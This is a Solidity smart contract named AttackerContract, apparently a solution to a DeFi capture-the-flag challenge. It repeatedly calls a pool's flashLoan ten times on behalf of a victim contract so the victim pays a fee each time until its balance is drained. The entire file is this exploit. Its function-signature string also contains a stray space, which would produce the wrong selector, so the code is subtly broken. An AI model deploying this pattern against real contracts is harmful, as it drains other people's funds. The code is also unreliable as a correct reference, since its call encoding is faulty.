// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title AttackerContract
 */

contract AttackerContract {
    address victimContract;
    address poolContract;

    constructor(address victim, address pool) {
        victimContract = victim;
        poolContract = pool;
    }

    function execute10flashLoans() public {
        // Execute 10 flashLoans

        for (uint256 i = 0; i < 10; i++) {
            (bool success, ) = poolContract.call(
                abi.encodeWithSignature(
                    "flashLoan(address, uint256)",
                    victimContract,
                    0
                )
            );
            require(success, "External call failed");
        }
    }
}
